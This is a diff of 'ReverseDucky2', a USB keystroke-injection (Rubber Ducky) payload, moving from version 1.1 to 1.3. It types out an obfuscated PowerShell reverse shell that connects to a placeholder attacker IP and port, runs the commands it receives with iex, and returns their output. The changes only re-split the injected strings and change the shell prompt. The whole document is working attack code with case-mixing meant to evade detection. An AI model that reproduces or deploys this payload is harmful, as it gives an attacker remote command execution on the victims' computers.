@@ -1,5 +1,5 @@
 REM       ReverseDucky2
-REM       Version 1.1
+REM       Version 1.3
 REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
 REM       Author: 0iphor13
 
@@ -16,11 +16,11 @@ DELAY 250
 ENTER
 
 DELAY 200
-STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("ATTACKER-IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$
+STRING $c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt("ATTACKER-IP",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$s
 DELAY 100
-STRING s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU
+STRING .REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oUt
 DELAY 100
-STRING t-STriNG);$x=$z+"RD "+(pwd)+"#";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
+STRING -STriNG);$x=$z+"PS "+(pwd)+"> ";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()
 DELAY 100
 ENTER
 
